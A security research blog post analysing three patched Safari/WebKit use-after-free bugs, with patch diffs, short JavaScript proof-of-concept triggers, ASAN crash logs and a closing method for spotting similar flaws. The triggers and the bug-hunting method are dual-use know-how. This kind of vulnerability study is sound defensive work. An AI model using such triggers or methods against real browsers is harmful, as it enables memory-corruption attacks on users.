---
title: A general attack model of UAF on browser
excerpt: "Notes of several UAFs on Safari"
modified: 2017-03-31
tags: [Notes,UAF,Attack Model]
category: 933KY
---

Saelo studied a [case](http://www.phrack.org/papers/attacking_javascript_engines.html) of attacking JavaScript engines on Phrack. This paper introduced CVE-2016-4622 in detail, which is a very classic case of UAF on JavaScript engines. I found that it is a very general case of attacking web browsers after studying several same case, so I decided to take notes on them.

###CVE-2017-2362

It's easy to find the git commit of this vulnerability by using a little trick. Let's see the patch:

```diff
@@ -367,19 +361,30 @@ void HTMLFormElement::reset()
     if (m_isInResetFunction || !frame)
         return;
 
-    m_isInResetFunction = true;
+    Ref<HTMLFormElement> protectedThis(*this);
+
+    SetForScope<bool> isInResetFunctionRestorer(m_isInResetFunction, true);
 
-    if (!dispatchEvent(Event::create(eventNames().resetEvent, true, true))) {
-        m_isInResetFunction = false;
+    if (!dispatchEvent(Event::create(eventNames().resetEvent, true, true)))
         return;
-    }
 
-    for (auto& associatedElement : m_associatedElements) {
-        if (is<HTMLFormControlElement>(*associatedElement))
-            downcast<HTMLFormControlElement>(*associatedElement).reset();
-    }
+    resetAssociatedFormControlElements();
+}
 
-    m_isInResetFunction = false;
+void HTMLFormElement::resetAssociatedFormControlElements()
+{
+    // Event handling can cause associated elements to be added or deleted while iterating
+    // over this collection. Protect these elements until we are done notifying them of
+    // the reset operation.
+    Vector<Ref<HTMLFormControlElement>> associatedFormControlElements;
+    associatedFormControlElements.reserveInitialCapacity(m_associatedElements.size());
+    for (auto* element : m_associatedElements) {
+        if (is<HTMLFormControlElement>(element))
+            associatedFormControlElements.uncheckedAppend(*downcast<HTMLFormControlElement>(element));
+    }
+    
+    for (auto& associatedFormControlElement : associatedFormControlElements)
+        associatedFormControlElement->reset();
 }
```

The patch added **HTMLFormElement::resetAssociatedFormControlElements()** to cache **m_associatedElements** in a Vector and iterate them instead of iterate **m_associatedElements** directly. What's the diffrence between them?

Check the PoC bellow:

```javascript
function runTest() {
    output.value = "test value";
    output.appendChild(inserted_div);
    document.getElementById("output").addEventListener('DOMSubtreeModified', function() {
        for(var i=0; i<20; i++) {
            form.appendChild(document.createElement("input"));
        }
    }, false);

    form.reset();
}
```

After debugging with lldb, we know that ```form.reset()``` ran into ```dispatchSubtreeModifiedEvent()``` and call back into **vmEntryToJavaScript** which cause the event listener called. The script uses ```form.appendChild(document.createElement("input"))``` to register form elements and get container reallocated, this will free the original elements of **m_associatedElements** and allocate another.

So what's the crux of the issue?

We can see the **m_associatedElements** has a **m_** prefixion which means it is a member variable, but when it is iterating like:

```javascript
for (auto& associatedElement : m_associatedElements) {
``` 

the compiler caches element's base address of **m_associatedElements** in the stack or register, so that TOCTOU is violated.

The ```(*associatedElement)``` will read 8 bytes and cause the UAF come into being.

It's amazing that it's still possible to break TOCTOU when simply access a container, the crux is accessing variable is a runtime operation, which differentiate from accessing from the original memory or the cache memory. It will be dangerous when programmer assumps it must access from origin.

Another crux is javascript engines allows to overide prototype's callback, this is a general attack model on browsers, we will disscus this at the end of this article. Now let's see two KeenLab's Safari vulnerabilities of Pwn2Own last year.

###CVE-2016-1859

I used another trick to get the commit, now let's take a look:

```diff
@@ -193,16 +193,21 @@ Node::InsertionNotificationRequest HTMLBodyElement::insertedInto(ContainerNode&
     // FIXME: It's surprising this is web compatible since it means a marginwidth and marginheight attribute can
     // magically appear on the <body> of all documents embedded through <iframe> or <frame>.
     // FIXME: Perhaps this code should be in attach() instead of here.
-    HTMLFrameOwnerElement* ownerElement = document().ownerElement();
-    if (is<HTMLFrameElementBase>(ownerElement)) {
-        HTMLFrameElementBase& ownerFrameElement = downcast<HTMLFrameElementBase>(*ownerElement);
-        int marginWidth = ownerFrameElement.marginWidth();
-        if (marginWidth != -1)
-            setIntegralAttribute(marginwidthAttr, marginWidth);
-        int marginHeight = ownerFrameElement.marginHeight();
-        if (marginHeight != -1)
-            setIntegralAttribute(marginheightAttr, marginHeight);
-    }
+    auto* ownerElement = document().ownerElement();
+    if (!is<HTMLFrameElementBase>(ownerElement))
+        return InsertionDone;
+    
+    auto& ownerFrameElement = downcast<HTMLFrameElementBase>(*ownerElement);
+
+    // Read values from the owner before setting any attributes, since setting an attribute can run arbitrary
+    // JavaScript, which might delete the owner element.
+    int marginWidth = ownerFrameElement.marginWidth();
+    int marginHeight = ownerFrameElement.marginHeight();
+
+    if (marginWidth != -1)
+        setIntegralAttribute(marginwidthAttr, marginWidth);
+    if (marginHeight != -1)
+        setIntegralAttribute(marginheightAttr, marginHeight);
 
     return InsertionDone;
 }
```

Notice that ```int marginHeight = ownerFrameElement.marginHeight();``` was moved to before ```setIntegralAttribute(marginwidthAttr, marginWidth);```

Run the PoC with ASAN, we got logs bellow:

Use:	```ownerFrameElement.marginHeight()```

```
ERROR: AddressSanitizer: heap-use-after-free on address 0x60e00002a370 at pc 0x00011b2893d3 bp 0x7fff53a89c60 sp 0x7fff53a89c58
READ of size 4 at 0x60e00002a370 thread T0
    #0 0x11b2893d2 in WebCore::HTMLFrameElementBase::marginHeight() const (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x1c433d2)
......
```

Free:	```setIntegralAttribute(marginwidthAttr, marginWidth); --> gc()```

```
freed by thread T0 here:
    #0 0x110fe7799 in wrap_free (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/7.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib+0x43799)
    #1 0x1158d7fa5 in bmalloc::Deallocator::deallocateSlowCase(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2dcdfa5)
    #2 0x1157dc613 in bmalloc::Deallocator::deallocate(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2cd2613)
    #3 0x1157dc5b5 in bmalloc::Cache::deallocate(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2cd25b5)
    #4 0x1157db314 in bmalloc::api::free(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2cd1314)
    #5 0x1157da9a4 in WTF::fastFree(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2cd09a4)
    #6 0x1199409a4 in WebCore::Node::operator delete(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x2fa9a4)
    #7 0x11b6a97c1 in WebCore::HTMLIFrameElement::~HTMLIFrameElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x20637c1)
    #8 0x11dbcbaf6 in WebCore::Node::removedLastRef() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x4585af6)
    #9 0x11965e48e in WebCore::Node::deref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x1848e)
    #10 0x11dbbbf04 in WebCore::Node::derefEventTarget() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x4575f04)
    #11 0x11a66ad82 in WebCore::EventTarget::deref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x1024d82)
    #12 0x11ab6d1e9 in WTF::Ref<WebCore::EventTarget>::~Ref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x15271e9)
    #13 0x11ab4d9c4 in WTF::Ref<WebCore::EventTarget>::~Ref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x15079c4)
......
```

We can see that ```setIntegralAttribute(marginwidthAttr, marginWidth);``` caused a garbage collection to get **ownerFrameElement** freed, ```ownerFrameElement.marginHeight()``` will read the freed memory and UAF happened.

This is because ```setIntegralAttribute(marginwidthAttr, marginWidth);``` will trigger **DOMSubtreeModified** event so that javascript code execution fall back into attacker's hand, remove the form node and force to garbage collection will get the container object freed.

This vulnerability isn't as complex as CVE-2017-2362, the hole to break TOCTOU is ```setIntegralAttribute(marginwidthAttr, marginWidth);```

###CVE-2016-1857

```diff
@@ -495,9 +495,8 @@ static inline JSValue join(ExecState& state, JSObject* thisObject, StringView se
         bool holesKnownToBeOK = false;
         for (unsigned i = 0; i < length; ++i) {
             if (JSValue value = data[i].get()) {
-                joiner.append(state, value);
-                if (state.hadException())
-                    return jsUndefined();
+                if (!joiner.appendWithoutSideEffects(state, value))
+                    goto generalCase;
             } else {
                 if (!holesKnownToBeOK) {
                     if (holesMustForwardToPrototype(state, thisObject))
@@ -545,9 +544,8 @@ static inline JSValue join(ExecState& state, JSObject* thisObject, StringView se
         auto data = storage.vector().data();
         for (unsigned i = 0; i < length; ++i) {
             if (JSValue value = data[i].get()) {
-                joiner.append(state, value);
-                if (state.hadException())
-                    return jsUndefined();
+                if (!joiner.appendWithoutSideEffects(state, value))
+                    goto generalCase;
             } else
                 joiner.appendEmptyString();
         }

-ALWAYS_INLINE void JSStringJoiner::append(ExecState& state, JSValue value)
+ALWAYS_INLINE bool JSStringJoiner::appendWithoutSideEffects(ExecState& state, JSValue value)
 {
     // The following code differs from using the result of JSValue::toString in the following ways:
     // 1) It's inlined more than JSValue::toString is.
@@ -105,35 +106,44 @@ ALWAYS_INLINE void JSStringJoiner::append(ExecState& state, JSValue value)
     // 3) It doesn't create a JSString for numbers, true, or false.
     // 4) It turns undefined and null into the empty string instead of "undefined" and "null".
     // 5) It uses optimized code paths for all the cases known to be 8-bit and for the empty string.
+    // If we might make an effectful calls, return false. Otherwise return true.
 
     if (value.isCell()) {
         JSString* jsString;
-        if (value.asCell()->isString())
-            jsString = asString(value);
-        else
-            jsString = value.toString(&state);
+        if (!value.asCell()->isString())
+            return false;
+        jsString = asString(value);
         append(jsString->viewWithUnderlyingString(state));
-        return;
+        return true;
     }
 
     if (value.isInt32()) {
         append8Bit(state.vm().numericStrings.add(value.asInt32()));
-        return;
+        return true;
     }
     if (value.isDouble()) {
         append8Bit(state.vm().numericStrings.add(value.asDouble()));
-        return;
+        return true;
     }
     if (value.isTrue()) {
         append8Bit(state.vm().propertyNames->trueKeyword.string());
-        return;
+        return true;
     }
     if (value.isFalse()) {
         append8Bit(state.vm().propertyNames->falseKeyword.string());
-        return;
+        return true;
     }
     ASSERT(value.isUndefinedOrNull());
     appendEmptyString();
+    return true;
+}
+
+ALWAYS_INLINE void JSStringJoiner::append(ExecState& state, JSValue value)
+{
+    if (!appendWithoutSideEffects(state, value)) {
+        JSString* jsString = value.toString(&state);
+        append(jsString->viewWithUnderlyingString(state));
+    }
 }
```
Simply says, it added a effectful check to avoid operating on cached butterfly after **toString()**.

The original PoC is obfuscated, deobfuscate it as follows:

```javascript
var bigArray = [];

function func() {}

Function.prototype.toString = function(x) {
    bigArray.push(func);
    return 123;
};

function trigger() {    
    for (var i = 0; i < 2000; i++) {
        bigArray.push(func);
    }    
    var stringResult = bigArray.join(":");
}
```

Now the vulnerability is obviously, check the ASAN:

Use:	```data[i].get()```

```
ERROR: AddressSanitizer: heap-use-after-free on address 0x631000090058 at pc 0x0001105c607c bp 0x7fff55e027d0 sp 0x7fff55e027c8
READ of size 8 at 0x631000090058 thread T0
    #0 0x1105c607b in JSC::WriteBarrierBase<JSC::Unknown>::get() const (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x20f07b)
    #1 0x110720c71 in JSC::join(JSC::ExecState&, JSC::JSObject*, WTF::StringView) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x369c71)
    #2 0x110717aa3 in JSC::arrayProtoFuncJoin(JSC::ExecState*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x360aa3)
```

Free:	```bigArray.push(func)```

```
freed by thread T0 here:
    #0 0x10e89d799 in wrap_free (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/7.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib+0x43799)
    #1 0x113061a94 in bmalloc::Deallocator::deallocateSlowCase(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2caaa94)
    #2 0x112f56273 in bmalloc::Deallocator::deallocate(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9f273)
    #3 0x112f56215 in bmalloc::Cache::deallocate(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9f215)
    #4 0x112f54ce4 in bmalloc::api::free(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9dce4)
    #5 0x112f543e4 in WTF::fastAlignedFree(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9d3e4)
    #6 0x110cbcc31 in JSC::CopiedBlock::destroy(JSC::Heap&, JSC::CopiedBlock*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x905c31)
    #7 0x110cbf4d8 in JSC::CopiedSpace::tryReallocateOversize(void**, unsigned long, unsigned long) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x9084d8)
    #8 0x110cbeca4 in JSC::CopiedSpace::tryReallocate(void**, unsigned long, unsigned long) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x907ca4)
    #9 0x1123437c1 in JSC::Heap::tryReallocateStorage(JSC::JSCell*, void**, unsigned long, unsigned long) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1f8c7c1)
    #10 0x11233ce55 in JSC::Butterfly::growArrayRight(JSC::VM&, JSC::JSCell*, JSC::Structure*, unsigned long, bool, unsigned long, unsigned long) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1f85e55)
    #11 0x11232f03c in JSC::JSObject::ensureLengthSlow(JSC::VM&, unsigned int) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1f7803c)
    #12 0x11212021b in JSC::JSObject::ensureLength(JSC::VM&, unsigned int) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1d6921b)
    #13 0x112336554 in bool JSC::JSObject::putByIndexBeyondVectorLengthWithoutAttributes<(unsigned char)8>(JSC::ExecState*, unsigned int, JSC::JSValue) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1f7f554)
    #14 0x112114ce6 in JSC::JSArray::push(JSC::ExecState*, JSC::JSValue) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1d5dce6)
    #15 0x11142723b in operationArrayPush (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x107023b)
```

```JSC::join(JSC::ExecState&, JSC::JSObject*, WTF::StringView)``` will call ```toSting()``` to do type conversion to every non-String element of the array passed in, and attacker could just overide the ```toString()``` callback to add some side effects causing the butterfly reallocated.

This vulnerability looks as same as CVE-2017-2362, but it is diffrent, ```auto data = storage.vector().data();``` cached the address of the vector container artificially which is a very dangerous operation.

##Summerise

Many other UAFs are made of accesing resources by muti threads or processes. But in browsers, JavaScript engines allows overiding prototype's callback which make native code execution path in flexible, so that one thread can also cause unexpected UAF if TOCTOU was violated. Focus on functions that will trigger any handler event, and type conversions that have implicit callbacks, be aware of the location of variable, focus it when the global of member variable is cached, try to find if there is a TOCTOU hole between two access operation of the cache.